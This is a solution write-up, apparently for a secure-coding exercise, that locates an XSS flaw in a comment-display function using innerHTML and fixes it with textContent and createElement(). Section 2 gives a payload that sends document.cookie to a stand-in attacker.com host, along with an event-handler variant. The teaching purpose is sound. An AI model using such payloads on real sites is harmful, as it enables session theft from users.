## Solution

### 1. **Vulnerability Location**

The vulnerability exists in the `displayUserComment()` function at the line:
```javascript
commentDiv.innerHTML += userComment;
```

The `innerHTML` property **does not escape HTML entities**. It directly parses and renders any HTML/JavaScript in the string.

### 2. **Malicious Payload**

An attacker could submit the following as `commentText`:
```javascript
test"><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script><span class="
```

Or a simpler payload using event handlers:
```javascript
test" onload="alert('XSS Vulnerability')" class="
```

### 3. **Resulting HTML**

After template interpolation, the HTML would be:
```html
<div class="comment">
    <strong>attacker</strong>: 
    <span id="comment-text">test"><script>alert('XSS')</script><span class="</span>
    <button onclick="deleteComment('test"><script>alert('XSS')</script><span class="')">Delete</button>
</div>
```

The JavaScript code becomes executable when the page is rendered. Additionally, the `deleteComment()` function has a secondary XSS vulnerability because the malicious text is injected into the onclick handler.

### 4. **Attack Consequences**

The attacker could:
- Steal user session cookies
- Redirect users to malicious sites
- Deface the web page
- Perform actions on behalf of the user
- Capture user input

### 5. **Fix: Use `textContent` and `createElement()`**

```javascript
function displayUserComment(commentText, username) {
    const commentDiv = document.getElementById('comments-section');

    // Create elements safely without HTML parsing
    const comment = document.createElement('div');
    comment.className = 'comment';

    const usernameSpan = document.createElement('strong');
    usernameSpan.textContent = username;  // textContent escapes HTML

    const commentSpan = document.createElement('span');
    commentSpan.id = 'comment-text';
    commentSpan.textContent = commentText;  // textContent escapes HTML

    const deleteBtn = document.createElement('button');
    deleteBtn.textContent = 'Delete';
    deleteBtn.addEventListener('click', () => deleteComment(commentText));

    comment.appendChild(usernameSpan);
    comment.appendChild(document.createTextNode(': '));
    comment.appendChild(commentSpan);
    comment.appendChild(deleteBtn);

    commentDiv.appendChild(comment);
}
```

**Why this is secure:**
- `textContent` only sets plain text, automatically escaping any HTML characters
- `createElement()` and `appendChild()` prevent HTML parsing of user input
- Event listeners avoid inline onclick attributes that can be manipulated
- No string interpolation with user input in HTML contexts

